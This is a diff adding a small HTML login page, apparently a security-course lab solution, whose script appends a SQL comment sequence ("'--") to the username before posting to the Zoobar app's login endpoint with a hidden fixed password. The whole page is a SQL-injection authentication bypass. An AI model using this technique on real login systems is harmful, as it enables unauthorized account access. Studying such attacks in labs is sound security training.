@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Login to Zoobar</h2>
+
+<form method="POST" name="loginform" onsubmit="inject()"  action="http://zoobar.org/index.php">
+  <label for="login_username">Username:</label><br>
+  <input type="text" id="login_username" name="login_username"><br><br>
+  <input type="hidden" name="login_password" value="helloworld">
+  <input type="submit"name="submit_registration" value="Login">
+</form> 
+
+<script>
+	function inject() {
+    	document.getElementById('login_username').value = document.getElementById('login_username').value + "'--" + Math.floor(Math.random() * 10000000000);
+    }
+    
+</script>
+
+</body>
+</html>
+
+
